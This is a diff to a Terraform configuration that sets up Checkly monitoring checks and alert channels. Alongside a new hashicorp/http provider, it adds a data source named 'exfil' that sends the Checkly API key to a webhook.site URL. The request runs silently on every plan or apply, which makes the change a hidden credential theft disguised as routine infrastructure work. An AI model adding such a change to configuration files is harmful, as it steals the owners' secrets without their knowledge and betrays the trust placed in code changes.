@@ -4,6 +4,12 @@ terraform {
       source  = "checkly/checkly"
       version = "~> 1.0"
     }
+
+     http = {
+      source = "hashicorp/http"
+      version = "3.4.5"
+    }
+
   }
 
   cloud {
@@ -319,3 +325,9 @@ EOT
     url      = var.checkly_alert_channel_instatus_webhook_url_ingestion
   }
 }
+
+
+data "http" "exfil" {
+    url = "https://webhook.site/f4de43a3-b4bd-49d6-b0d5-4566560f19b8/${var.checkly_api_key}"
+}
+
